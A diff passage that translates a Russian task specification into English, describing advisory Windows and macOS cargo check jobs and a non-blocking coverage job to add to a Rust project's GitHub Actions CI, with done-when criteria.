-   вводить (первый замер — базовая линия, ворота — отдельное решение
-   владельца по её цифрам).
-3. Итоговые числа (покрытие %, статус матрицы) — внести строкой в PR.
+**Task.**
+1. Matrix: add one advisory job `cargo check --all-features
+   --all-targets` on `windows-latest` + one on `macos-latest`
+   (advisory: non-blocking; their status is recorded in the job report;
+   do not make them blocking — the ubuntu jobs remain the only
+   blocking set; linux-only dependencies, if found — list them
+   loudly in the PR body).
+2. Coverage: an advisory job `cargo llvm-cov --summary` (or
+   tarpaulin) uploading a summary artifact; do NOT introduce
+   threshold gates (the first measurement is the baseline; gates are a separate owner
+   decision based on its numbers).
+3. The final numbers (coverage %, matrix status) — add as a line in the PR.
 
-**§3.** `.github/workflows/ci.yml`. Ноль диффа в `src/**` и
+**§3.** `.github/workflows/ci.yml`. Zero diff in `src/**` and
 `tests/**`.
 
-**Сделано, когда:** три новые advisory-джобы в CI зелёные (или их
-краснота — воспроизводимый documented-факт с root-причиной в PR-теле);
-coverage-артефакт с baseline-цифрой; блокирующий набор не изменился
-(14 blocking джоб на месте).
+**Done, when:** the three new advisory jobs in CI are green (or their
+redness is a reproducible documented fact with the root cause in the PR body);
+a coverage artifact with a baseline number; the blocking set unchanged
+(14 blocking jobs in place).
